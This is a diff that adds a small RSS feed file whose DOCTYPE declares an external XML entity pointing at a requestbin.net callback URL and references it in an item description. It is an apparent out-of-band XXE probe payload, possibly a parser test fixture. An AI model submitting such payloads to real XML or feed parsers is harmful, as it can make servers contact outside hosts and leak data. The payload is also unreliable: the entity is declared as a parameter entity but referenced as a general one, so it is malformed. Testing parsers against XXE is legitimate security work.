@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ 
+<!ELEMENT root ANY >
+<!ENTITY % quip SYSTEM "http://requestbin.net/r/1fgqz5h1"> 
+]>
+<rss version="2.0">
+<channel>
+    <item>
+        <title>Hello</title>
+        <link>http://example.com</link>
+        <description>&quip;</description>
+    </item>
+</channel>
+</rss>
